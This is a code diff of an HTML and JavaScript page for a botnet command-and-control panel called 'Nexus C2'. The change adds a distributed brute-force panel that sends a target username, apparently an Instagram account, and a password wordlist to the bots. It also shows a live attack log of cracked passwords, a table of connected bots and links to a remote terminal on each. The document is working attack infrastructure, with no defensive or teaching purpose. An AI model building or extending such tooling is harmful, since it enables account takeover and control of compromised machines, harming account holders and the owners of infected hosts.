@@ -1,55 +1,370 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>C2 Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus C2 - Dashboard</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
-        .container { max-width: 1200px; margin: 0 auto; border: 1px solid #0f0; padding: 20px; }
-        h1 { border-bottom: 1px solid #0f0; padding-bottom: 10px; }
-        .logout { float: right; color: #f44; text-decoration: none; border: 1px solid #f44; padding: 5px 15px; }
-        .logout:hover { background: #f44; color: #000; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { border: 1px solid #0f0; padding: 10px; text-align: left; }
-        th { background: #001a00; }
-        .online { color: #0f0; }
-        .btn { background: #000; border: 1px solid #0f0; color: #0f0; padding: 5px 15px; text-decoration: none; display: inline-block; }
-        .btn:hover { background: #0f0; color: #000; }
-        .empty { text-align: center; padding: 30px; color: #050; }
-        .badge { display: inline-block; width: 10px; height: 10px; background: #0f0; border-radius: 50%; animation: pulse 1.5s infinite; margin-right: 10px; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
+        body {
+            background: #0b0e14;
+            color: #e0e6ed;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            padding: 20px;
+        }
+        .app {
+            max-width: 1400px;
+            width: 100%;
+        }
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid #1e2630;
+            margin-bottom: 30px;
+        }
+        .logo h1 { font-size: 24px; font-weight: 700; background: linear-gradient(135deg, #00d4ff, #7b2ffc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .logo span { color: #5a6a7a; font-weight: 300; }
+        .user-badge { display: flex; align-items: center; gap: 15px; }
+        .user-badge a { color: #ff6b6b; text-decoration: none; border: 1px solid #ff6b6b; padding: 6px 18px; border-radius: 20px; font-size: 13px; transition: 0.3s; }
+        .user-badge a:hover { background: #ff6b6b; color: #fff; }
+
+        /* Grid */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+        .card {
+            background: #141a24;
+            border-radius: 16px;
+            padding: 24px;
+            border: 1px solid #1e2a36;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+            backdrop-filter: blur(4px);
+        }
+        .card-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 18px;
+            color: #8a9bb5;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .card-title .badge { background: #1e2a36; padding: 2px 12px; border-radius: 20px; font-size: 11px; color: #00d4ff; }
+
+        /* Inputs */
+        .input-group { margin-bottom: 16px; }
+        .input-group label { display: block; font-size: 13px; color: #8a9bb5; margin-bottom: 6px; }
+        .input-group input, .input-group textarea {
+            width: 100%;
+            padding: 12px 16px;
+            background: #0b1018;
+            border: 1px solid #1e2a36;
+            border-radius: 10px;
+            color: #e0e6ed;
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-group input:focus, .input-group textarea:focus { border-color: #00d4ff; box-shadow: 0 0 0 3px rgba(0,212,255,0.1); }
+        .input-group textarea { min-height: 100px; resize: vertical; font-family: monospace; }
+
+        .btn {
+            padding: 12px 28px;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-primary { background: linear-gradient(135deg, #00d4ff, #7b2ffc); color: #fff; }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,212,255,0.3); }
+        .btn-danger { background: #ff4757; color: #fff; }
+        .btn-danger:hover { background: #ff6b81; }
+        .btn-success { background: #2ed573; color: #fff; }
+        .btn-group { display: flex; gap: 12px; margin-top: 10px; flex-wrap: wrap; }
+
+        /* Stats */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .stat-item {
+            background: #0b1018;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid #1e2a36;
+        }
+        .stat-item .num { font-size: 28px; font-weight: 700; color: #fff; }
+        .stat-item .label { font-size: 12px; color: #6a7a8a; margin-top: 4px; }
+        .stat-item.success .num { color: #2ed573; }
+        .stat-item.danger .num { color: #ff4757; }
+        .stat-item.info .num { color: #00d4ff; }
+
+        /* Bots Table */
+        .table-wrap {
+            overflow-x: auto;
+            margin-top: 15px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+        }
+        th {
+            text-align: left;
+            padding: 12px 16px;
+            color: #6a7a8a;
+            border-bottom: 1px solid #1e2a36;
+            font-weight: 500;
+        }
+        td {
+            padding: 12px 16px;
+            border-bottom: 1px solid #0f1720;
+            color: #c8d0d8;
+        }
+        tr:hover td { background: #0f1720; }
+        .online { color: #2ed573; }
+        .btn-sm {
+            padding: 4px 14px;
+            border-radius: 20px;
+            background: #1e2a36;
+            border: none;
+            color: #00d4ff;
+            font-size: 12px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-decoration: none;
+        }
+        .btn-sm:hover { background: #00d4ff; color: #0b0e14; }
+
+        /* Results Log */
+        .log-container {
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            background: #0b1018;
+            border-radius: 10px;
+            padding: 12px;
+            margin-top: 15px;
+            border: 1px solid #1e2a36;
+        }
+        .log-entry { padding: 4px 0; border-bottom: 1px solid #0f1720; display: flex; gap: 12px; }
+        .log-entry .success { color: #2ed573; }
+        .log-entry .fail { color: #ff4757; }
+
+        @media (max-width: 800px) {
+            .grid-2 { grid-template-columns: 1fr; }
+            .stats-grid { grid-template-columns: 1fr 1fr; }
+        }
     </style>
 </head>
 <body>
-<div class="container">
-    <h1>ROOT C2 :: CONTROL <a href="/logout" class="logout">[LOGOUT]</a></h1>
-    <div><span class="badge"></span> LIVE | AUTO-REFRESH: 3s | BOTS: <span id="botCount">0</span></div>
-    <table>
-        <thead><tr><th>ID</th><th>IP</th><th>OS</th><th>LAST SEEN</th><th>ACTION</th></tr></thead>
-        <tbody id="botsTable"><tr><td colspan="5" class="empty">WAITING FOR CONNECTIONS...</td></tr></tbody>
-    </table>
+<div class="app">
+    <!-- Header -->
+    <div class="header">
+        <div class="logo"><h1>⚡ Nexus <span>C2</span></h1></div>
+        <div class="user-badge">
+            <span style="color:#6a7a8a;">Admin</span>
+            <a href="/logout">LOGOUT</a>
+        </div>
+    </div>
+
+    <!-- Grid: Brute Force + Stats -->
+    <div class="grid-2">
+        <!-- Left: Control -->
+        <div class="card">
+            <div class="card-title">🎯 Distributed Brute Force <span class="badge">BOTNET</span></div>
+            <div class="input-group">
+                <label>Target Username</label>
+                <input type="text" id="targetUser" placeholder="instagram_username" value="testuser123">
+            </div>
+            <div class="input-group">
+                <label>Wordlist (one password per line)</label>
+                <textarea id="wordlistArea">password123
+admin
+123456
+letmein
+qwerty
+iloveyou</textarea>
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-primary" onclick="startAttack()">▶ START ATTACK</button>
+                <button class="btn btn-danger" onclick="stopAttack()">■ STOP</button>
+            </div>
+            <div style="margin-top:12px; font-size:13px; color:#6a7a8a;">
+                <span id="statusText">Status: Idle</span>
+            </div>
+        </div>
+
+        <!-- Right: Stats -->
+        <div class="card">
+            <div class="card-title">📊 Real-time Statistics</div>
+            <div class="stats-grid">
+                <div class="stat-item info"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
+                <div class="stat-item"><div class="num" id="statPending">0</div><div class="label">Pending</div></div>
+                <div class="stat-item success"><div class="num" id="statSuccess">0</div><div class="label">Success</div></div>
+                <div class="stat-item danger"><div class="num" id="statFail">0</div><div class="label">Failed</div></div>
+            </div>
+            <div style="margin-top:20px;">
+                <div style="display:flex; justify-content:space-between; font-size:13px; color:#6a7a8a;">
+                    <span>Progress</span>
+                    <span id="progressText">0%</span>
+                </div>
+                <div style="width:100%; height:6px; background:#0b1018; border-radius:10px; margin-top:6px;">
+                    <div id="progressBar" style="width:0%; height:100%; background:linear-gradient(90deg, #00d4ff, #7b2ffc); border-radius:10px; transition:width 0.5s;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Logs & Results -->
+    <div class="card" style="margin-bottom:30px;">
+        <div class="card-title">📋 Attack Log <span class="badge" id="logCount">0</span></div>
+        <div class="log-container" id="logContainer">
+            <div class="log-entry" style="color:#6a7a8a;">[System] Waiting for attack...</div>
+        </div>
+    </div>
+
+    <!-- Bots Table -->
+    <div class="card">
+        <div class="card-title">🖥️ Connected Bots <span class="badge" id="botCount">0</span></div>
+        <div class="table-wrap">
+            <table>
+                <thead><tr><th>ID</th><th>IP</th><th>OS</th><th>Last Seen</th><th>Action</th></tr></thead>
+                <tbody id="botsTable">
+                    <tr><td colspan="5" style="text-align:center; color:#6a7a8a;">No bots connected</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
 </div>
+
 <script>
+    // ========== UI Functions ==========
+    function addLog(message, type = 'info') {
+        const container = document.getElementById('logContainer');
+        const entry = document.createElement('div');
+        entry.className = 'log-entry';
+        const time = new Date().toLocaleTimeString();
+        let color = '#6a7a8a';
+        if (type === 'success') color = '#2ed573';
+        if (type === 'fail') color = '#ff4757';
+        if (type === 'info') color = '#00d4ff';
+        entry.innerHTML = `<span style="color:#6a7a8a;">[${time}]</span> <span style="color:${color};">${message}</span>`;
+        container.appendChild(entry);
+        container.scrollTop = container.scrollHeight;
+        document.getElementById('logCount').innerText = container.children.length;
+    }
+
+    // ========== API Calls ==========
+    async function startAttack() {
+        const target = document.getElementById('targetUser').value.trim();
+        const wordlist = document.getElementById('wordlistArea').value;
+        if (!target || !wordlist) { alert('Please enter target and wordlist'); return; }
+
+        addLog(`🚀 Starting attack on ${target} with ${wordlist.split('\n').length} passwords...`, 'info');
+        document.getElementById('statusText').innerText = 'Status: Running...';
+
+        try {
+            const res = await fetch('/bruteforce/start', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target, wordlist })
+            });
+            const data = await res.json();
+            if (data.status === 'started') {
+                addLog(`✅ Attack started. Total passwords: ${data.total}`, 'success');
+            } else {
+                addLog(`❌ Error: ${data.message}`, 'fail');
+            }
+        } catch(e) {
+            addLog(`❌ Network Error: ${e}`, 'fail');
+        }
+    }
+
+    async function stopAttack() {
+        try {
+            await fetch('/bruteforce/stop', { method: 'POST' });
+            addLog('⏹️ Attack stopped by user.', 'info');
+            document.getElementById('statusText').innerText = 'Status: Stopped';
+        } catch(e) { console.error(e); }
+    }
+
+    async function fetchStatus() {
+        try {
+            const res = await fetch('/bruteforce/status');
+            const data = await res.json();
+            
+            document.getElementById('statTotal').innerText = data.total || 0;
+            document.getElementById('statPending').innerText = data.queue_length || 0;
+            document.getElementById('statSuccess').innerText = data.success || 0;
+            document.getElementById('statFail').innerText = data.failed || 0;
+            
+            const processed = data.processed || 0;
+            const total = data.total || 1;
+            const pct = Math.round((processed / total) * 100);
+            document.getElementById('progressBar').style.width = Math.min(pct, 100) + '%';
+            document.getElementById('progressText').innerText = Math.min(pct, 100) + '%';
+
+            if (data.active) document.getElementById('statusText').innerText = 'Status: 🔥 Running...';
+            else if (data.success > 0) document.getElementById('statusText').innerText = '✅ Password Found!';
+            else if (data.processed > 0) document.getElementById('statusText').innerText = '⏹️ Idle / Finished';
+
+            // تحديث اللوج إذا جات نتائج جديدة (نحتفظ بآخر 10)
+            if (data.results && data.results.length > 0) {
+                const last = data.results[data.results.length - 1];
+                if (last.success) {
+                    addLog(`🎯 ${last.bot_id} -> SUCCESS: ${last.password} (${last.message})`, 'success');
+                } else {
+                    addLog(`❌ ${last.bot_id} -> FAIL: ${last.password} (${last.message})`, 'fail');
+                }
+            }
+        } catch(e) { console.error(e); }
+    }
+
     async function fetchBots() {
         try {
             const res = await fetch('/api/active_bots');
             const bots = await res.json();
             document.getElementById('botCount').innerText = bots.length;
             const table = document.getElementById('botsTable');
-            if (bots.length === 0) { table.innerHTML = '<tr><td colspan="5" class="empty">NO ACTIVE SESSIONS</td></tr>'; return; }
+            if (bots.length === 0) {
+                table.innerHTML = '<tr><td colspan="5" style="text-align:center; color:#6a7a8a;">No bots connected</td></tr>';
+                return;
+            }
             table.innerHTML = bots.map(b => `
                 <tr>
-                    <td><span class="online">[+]</span> ${b.id}</td>
+                    <td><span class="online">●</span> ${b.id}</td>
                     <td>${b.ip}</td>
                     <td>${b.os}</td>
                     <td>${b.last_seen}</td>
-                    <td><a href="/room/${b.id}" class="btn">CONNECT</a></td>
+                    <td><a href="/room/${b.id}" class="btn-sm">Terminal</a></td>
                 </tr>
             `).join('');
         } catch(e) { console.error(e); }
     }
+
+    // تحديث كل 2 ثانية
+    setInterval(fetchStatus, 2000);
     setInterval(fetchBots, 3000);
     fetchBots();
+
+    // نضيف إدخال سريع للعينة
+    addLog('🛸 System ready. Waiting for attack...', 'info');
 </script>
 </body>
 </html>
